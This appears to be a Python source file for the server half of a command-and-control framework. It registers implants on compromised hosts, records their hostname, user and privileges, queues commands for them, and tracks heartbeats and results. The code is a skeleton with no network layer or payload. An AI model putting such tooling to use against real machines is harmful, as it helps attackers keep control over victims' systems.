"""
C2 Server Implementation
Manages command and control communications with implants
"""
import asyncio
import logging
from typing import Dict, List, Optional
from datetime import datetime
import uuid

logger = logging.getLogger(__name__)


class C2Server:
    """Command and Control Server"""
    
    def __init__(self):
        self.implants: Dict[str, Dict] = {}
        self.active_sessions: Dict[str, any] = {}
        self.task_queue: Dict[str, List[Dict]] = {}
    
    async def register_implant(self, implant_data: Dict) -> Dict:
        """
        Register a new implant
        
        Args:
            implant_data: Implant registration data
            
        Returns:
            Registration confirmation with API key
        """
        try:
            implant_id = str(uuid.uuid4())
            api_key = self._generate_api_key()
            
            implant = {
                "id": implant_id,
                "hostname": implant_data.get("hostname"),
                "ip_address": implant_data.get("ip_address"),
                "os": implant_data.get("os"),
                "username": implant_data.get("username"),
                "privileges": implant_data.get("privileges"),
                "api_key": api_key,
                "status": "active",
                "first_seen": datetime.utcnow().isoformat(),
                "last_seen": datetime.utcnow().isoformat(),
                "metadata": implant_data.get("metadata", {})
            }
            
            self.implants[implant_id] = implant
            self.task_queue[implant_id] = []
            
            logger.info(f"Implant registered: {implant_id} on {implant['hostname']}")
            
            return {
                "implant_id": implant_id,
                "api_key": api_key,
                "status": "registered",
                "check_in_interval": 60  # seconds
            }
            
        except Exception as e:
            logger.error(f"Error registering implant: {e}")
            raise
    
    async def heartbeat(self, implant_id: str, status_data: Dict) -> Dict:
        """
        Process implant heartbeat
        
        Args:
            implant_id: Implant identifier
            status_data: Current status information
            
        Returns:
            Response with pending tasks
        """
        try:
            if implant_id not in self.implants:
                return {"error": "Implant not registered"}
            
            # Update last seen
            self.implants[implant_id]["last_seen"] = datetime.utcnow().isoformat()
            self.implants[implant_id]["metadata"].update(status_data)
            
            # Get pending tasks
            pending_tasks = self.task_queue.get(implant_id, [])
            
            return {
                "status": "ok",
                "tasks": pending_tasks,
                "timestamp": datetime.utcnow().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error processing heartbeat: {e}")
            return {"error": str(e)}
    
    async def send_task(self, implant_id: str, task: Dict) -> Dict:
        """
        Queue a task for an implant
        
        Args:
            implant_id: Target implant
            task: Task definition
            
        Returns:
            Task confirmation
        """
        try:
            if implant_id not in self.implants:
                return {"error": "Implant not found"}
            
            task_id = str(uuid.uuid4())
            task_obj = {
                "task_id": task_id,
                "type": task.get("type"),
                "command": task.get("command"),
                "parameters": task.get("parameters", {}),
                "created_at": datetime.utcnow().isoformat(),
                "status": "pending"
            }
            
            self.task_queue[implant_id].append(task_obj)
            
            logger.info(f"Task queued: {task_id} for implant {implant_id}")
            
            return {
                "task_id": task_id,
                "status": "queued",
                "implant_id": implant_id
            }
            
        except Exception as e:
            logger.error(f"Error sending task: {e}")
            raise
    
    async def receive_task_result(self, implant_id: str, task_id: str, result: Dict) -> Dict:
        """
        Receive task execution result from implant
        
        Args:
            implant_id: Implant identifier
            task_id: Task identifier
            result: Task execution result
            
        Returns:
            Acknowledgment
        """
        try:
            # Remove task from queue
            if implant_id in self.task_queue:
                self.task_queue[implant_id] = [
                    t for t in self.task_queue[implant_id] if t["task_id"] != task_id
                ]
            
            logger.info(f"Task result received: {task_id} from {implant_id}")
            
            return {
                "status": "acknowledged",
                "task_id": task_id
            }
            
        except Exception as e:
            logger.error(f"Error receiving task result: {e}")
            raise
    
    async def get_implants(self, status: Optional[str] = None) -> List[Dict]:
        """Get list of implants"""
        implants = list(self.implants.values())
        
        if status:
            implants = [i for i in implants if i["status"] == status]
        
        return implants
    
    async def get_implant_details(self, implant_id: str) -> Optional[Dict]:
        """Get detailed information about an implant"""
        return self.implants.get(implant_id)
    
    async def remove_implant(self, implant_id: str) -> bool:
        """Remove/deactivate an implant"""
        if implant_id in self.implants:
            self.implants[implant_id]["status"] = "inactive"
            logger.info(f"Implant deactivated: {implant_id}")
            return True
        return False
    
    def _generate_api_key(self) -> str:
        """Generate secure API key for implant"""
        import secrets
        return secrets.token_hex(32)
    
    async def check_inactive_implants(self, timeout_seconds: int = 300):
        """Check for inactive implants based on timeout"""
        current_time = datetime.utcnow()
        
        for implant_id, implant in self.implants.items():
            last_seen = datetime.fromisoformat(implant["last_seen"])
            time_diff = (current_time - last_seen).total_seconds()
            
            if time_diff > timeout_seconds and implant["status"] == "active":
                implant["status"] = "inactive"
                logger.warning(f"Implant timeout: {implant_id}")


# Global C2 server instance
_c2_server: Optional[C2Server] = None


def get_c2_server() -> C2Server:
    """Get or create global C2 server instance"""
    global _c2_server
    
    if _c2_server is None:
        _c2_server = C2Server()
    
    return _c2_server
